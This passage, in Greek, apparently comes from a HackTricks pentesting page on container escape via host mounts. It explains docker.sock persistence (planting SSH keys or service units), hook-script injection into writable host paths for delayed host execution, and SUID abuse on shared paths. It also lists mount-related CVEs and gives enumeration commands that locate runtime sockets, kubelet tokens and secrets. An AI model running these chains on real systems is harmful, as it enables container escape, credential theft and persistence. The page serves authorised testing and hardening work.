Αν πετύχει κάποιο από αυτά, η διαδρομή από ένα «mounted socket» μέχρι την εκκίνηση ενός sibling container με περισσότερα προνόμια είναι συνήθως πολύ συντομότερη από οποιαδήποτε διαδρομή διαφυγής από τον kernel.

Η ίδια πρόσβαση στον daemon μπορεί επίσης να καθιερώσει **host persistence**. Ένα helper container με writable bind mount του host root μπορεί να λάβει αρχεία μέσω `docker cp` και έπειτα να χρησιμοποιήσει το `docker exec` για να τοποθετήσει ένα SSH key, ένα service unit ή άλλο αρχείο persistence κάτω από το mounted host path. Το όριο ασφαλείας είναι η εξουσία του daemon να δημιουργεί το host mount· το `docker cp` είναι απλώς ένα βήμα προετοιμασίας. Ελέγξτε τόσο τα νέα containers όσο και τις εγγραφές σε paths ελέγχου ταυτότητας ή εκκίνησης του host μετά την έκθεση ενός runtime socket.

## Παρέμβαση σε προγραμματισμένες εργασίες μέσω writable host path

Ένα writable host mount δεν χρειάζεται να εκθέτει το `/` για να είναι επικίνδυνο. Αν το mounted path περιέχει scripts, config files, hooks, plugins ή αρχεία που καταναλώνονται αργότερα από μια προγραμματισμένη εργασία ή υπηρεσία στην πλευρά του host, το container ενδέχεται να μπορεί να αλλάξει ό,τι εκτελεί ο host.

Γενική ροή ελέγχου:

```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```

Αν ένα εγγράψιμο αρχείο χρησιμοποιείται από μια διεργασία του host, διατήρησε το payload απλό και παρατηρήσιμο κατά τη δοκιμή:

```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```

Το ενδιαφέρον σημείο είναι το όριο εμπιστοσύνης: η εγγραφή γίνεται από το εσωτερικό του container, αλλά η εκτέλεση πραγματοποιείται αργότερα στο context της υπηρεσίας του host. Έτσι, ένα περιορισμένο hostPath ή bind mount μετατρέπεται σε primitive καθυστερημένης εκτέλεσης κώδικα στον host.

## Αρχεία με ιδιοκτήτη root σε κοινόχρηστο host path

Ένας λογαριασμός container που μπορεί να αποκτήσει δικαιώματα root ενδέχεται να μπορεί να τοποθετήσει ένα αρχείο με ιδιοκτήτη root σε μια εγγράψιμη διαδρομή που χρησιμοποιεί και ο host. Αν το UID 0 του container αντιστοιχεί στο UID 0 του host, και οι δύο προβολές αναφέρονται στο ίδιο αρχείο, ενώ το mount του host επιτρέπει την εκτέλεση SUID, ένας χρήστης του host που μπορεί να εκτελέσει ένα εκτελέσιμο SUID με ιδιοκτήτη root σε αυτήν τη διαδρομή ενδέχεται να περάσει το όριο προνομίων του host. Για αυτό το συγκεκριμένο ζήτημα ιδιοκτησίας αρχείων, δεν απαιτείται το container να εκτελείται με `--privileged`. Δείτε τις [αντιστοιχίσεις user namespace](protections/namespaces/user-namespace.md) και τη [συζήτηση για το SUID](privileged-containers.md) για τις ξεχωριστές προϋποθέσεις.

Ελέγξτε τη διαδρομή **και από τις δύο πλευρές**: συγκρίνετε την ιδιοκτησία και την ταυτότητα ενός αβλαβούς αρχείου, ελέγξτε τα `uid_map` και `gid_map` του container και εξετάστε τις επιλογές mount και την πολιτική εκτέλεσης του host. Το `rw` από την πλευρά του container χωρίς `nosuid` αποτελεί μόνο ένδειξη για περαιτέρω έλεγχο· δεν αποδεικνύει την ιδιοκτησία στον host, τα flags του mount στον host, την πρόσβαση χρήστη του host ή το αν το AppArmor/SELinux εμποδίζει την εκτέλεση. Το `noexec` περιορίζει την εκτέλεση στην προβολή όπου εφαρμόζεται. Τα tags `shared:` και `master:` στο `/proc/self/mountinfo` περιγράφουν τη διάδοση των mount, όχι το αν τα περιεχόμενα του αρχείου είναι κοινόχρηστα με τον host. Ένα bind mount μπορεί να μην έχει αυτά τα tags. Η επαναχρησιμοποίηση διαπιστευτηρίων που παρέχει σύνδεση στον host είναι ξεχωριστό βήμα από το όριο προνομίων που δημιουργεί το κοινόχρηστο αρχείο.

Ο χώρος αποθήκευσης του runtime στον host μπορεί να δημιουργήσει παρόμοια διαδρομή, ακόμη και χωρίς ρητό bind mount. Το [CVE-2021-41091](https://github.com/moby/moby/security/advisories/GHSA-3fwx-pjgw-3558) επέτρεπε σε μη προνομιούχο χρήστη του host να διασχίσει υποκαταλόγους δεδομένων του Docker και να εκτελέσει αρχεία από ένα filesystem container· το Moby διόρθωσε τα δικαιώματα στην έκδοση 20.10.9 και επισημαίνει ότι πρέπει να γίνει επανεκκίνηση των εκτελούμενων containers για να διορθωθούν οι κατάλογοί τους. Ελέγξτε τις ακριβείς προσαρτημένες διαδρομές `overlay2/<id>/merged` και τα δικαιώματα αναζήτησης κάθε γονικού καταλόγου. Στη συνέχεια, εξακριβώστε αν το UID 0 του container αντιστοιχεί στο UID 0 του host, αν υπάρχει και είναι προσβάσιμο ένα πραγματικό εκτελέσιμο SetUID με ιδιοκτήτη root και αν η προβολή του host επιτρέπει την εκτέλεση SetUID. Τα rootless ή user-namespace-remapped containers, τα `nosuid`, `noexec`, `no_new_privs` και η πολιτική MAC μπορούν να αλλάξουν το αποτέλεσμα. Η έκδοση του runtime ή μια διαδρομή που μπορεί να διασχιστεί αποτελούν αφορμή για έλεγχο, όχι απόδειξη εκτέλεσης ως root στον host· εξετάστε τα metadata των mount και των αρχείων χωρίς να εκτελέσετε κάποιο υποψήφιο εκτελέσιμο.

## CVE που σχετίζονται με mount

Τα host mount αλληλεπιδρούν επίσης με ευπάθειες runtime. Σημαντικά πρόσφατα παραδείγματα περιλαμβάνουν:

- Το `CVE-2024-21626` στο `runc`, όπου ένα διαρρεύσαν file descriptor καταλόγου μπορούσε να τοποθετήσει τον κατάλογο εργασίας στο filesystem του host.
- Τα `CVE-2024-23651`, `CVE-2024-23652` και `CVE-2024-23653` στο BuildKit, όπου κακόβουλα Dockerfile, frontends και ροές `RUN --mount` μπορούσαν να επαναφέρουν την πρόσβαση σε αρχεία του host, τη διαγραφή τους ή αυξημένα προνόμια κατά τη διάρκεια των builds.
- Το `CVE-2024-1753` στις ροές build των Buildah και Podman, όπου κατασκευασμένα bind mount κατά τη διάρκεια του build μπορούσαν να εκθέσουν το `/` με δικαιώματα ανάγνωσης και εγγραφής.
- Το `CVE-2025-47290` στο `containerd` 2.1.0, όπου μια συνθήκη TOCTOU κατά την αποσυσκευασία image μπορούσε να επιτρέψει σε ένα ειδικά κατασκευασμένο image να τροποποιήσει το filesystem του host κατά το pull.

Αυτά τα CVE έχουν σημασία εδώ επειδή δείχνουν ότι ο χειρισμός των mount δεν αφορά μόνο τη ρύθμιση από τον operator. Το ίδιο το runtime μπορεί επίσης να δημιουργήσει συνθήκες διαφυγής μέσω mount.

## Έλεγχοι

Χρησιμοποιήστε αυτές τις εντολές για να εντοπίσετε γρήγορα τις πιο σημαντικές εκθέσεις μέσω mount:

```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```

Τι είναι ενδιαφέρον εδώ:

- Το root του host, τα `/proc`, `/sys`, `/var` και τα runtime sockets είναι όλα ευρήματα υψηλής προτεραιότητας.
- Οι εγγράψιμες καταχωρίσεις στο proc/sys συχνά σημαίνουν ότι το mount εκθέτει καθολικά στοιχεία ελέγχου του kernel του host και όχι μια ασφαλή προβολή του container.
- Οι προσαρτημένες διαδρομές του `/var` απαιτούν έλεγχο διαπιστευτηρίων και γειτονικών workloads, όχι μόνο έλεγχο του filesystem.
- Οι κατάλογοι κατάστασης του Kubelet και οι διαδρομές CNI/plugin έχουν την ίδια προτεραιότητα με τα runtime sockets, επειδή συχνά βρίσκονται απευθείας στη διαδρομή δημιουργίας pod και διανομής διαπιστευτηρίων του node.

## Κατάσταση τοπικής επικύρωσης

Οι πρακτικές αλυσίδες αυτής της σελίδας ελέγχθηκαν σε έναν τοπικό Linux minikube node. Η επικύρωση αναπαρήγαγε:

- πρόσβαση ανάγνωσης και εγγραφής μέσω ενός προσωρινού εγγράψιμου hostPath
- εντοπισμό προβεβλημένων ServiceAccount tokens και προσαρτημένων Secrets μέσω του `/var/lib/kubelet/pods`
- επιτυχή αυθεντικοποίηση στο Kubernetes API με ένα ενεργό token που ανακτήθηκε από αυτή την προσαρτημένη κατάσταση του kubelet
- εντοπισμό μόνο για ανάγνωση ενός γειτονικού Docker `overlay2` filesystem μέσω προσαρτημένου `/var`
- δημιουργία sibling container μέσω του Docker API με host bind μόνο για ανάγνωση, μέσω προσαρτημένου `docker.sock`
- καθυστερημένη εκτέλεση στον host μέσω ενός προσωρινού hook που καταναλώνεται από τον host
- προσομοίωση CNI-wrapper που διατήρησε τα ορίσματα, την τυπική είσοδο και την εκτέλεση του αρχικού plugin

Ο ίδιος node εξέθετε τα `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore` και `config.gz`, αλλά δεν εξέθετε τα `uevent_helper`, τις μεταβλητές EFI, τις θερμικές καταχωρίσεις ή το `sched_debug`. Δεν εκτελέστηκαν καταστροφικά triggers του kernel. Αυτό επιβεβαιώνει ότι οι αλυσίδες μέσω host-root, `/var`, κατάστασης kubelet, sockets και host-consumer είναι αναπαραγώγιμες, ενώ οι τεχνικές helper μέσω procfs/sysfs πρέπει να θεωρούνται υπό όρους, ανάλογα με τον ακριβή kernel, τη λειτουργία mount, τη διαδρομή payload και το trigger.

## References

- [1] [Τοπικά αρχεία και διαδρομές που χρησιμοποιούνται από το Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [Το container cilium-agent μπορεί να αποκτήσει πρόσβαση στον host μέσω mount `hostPath`](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
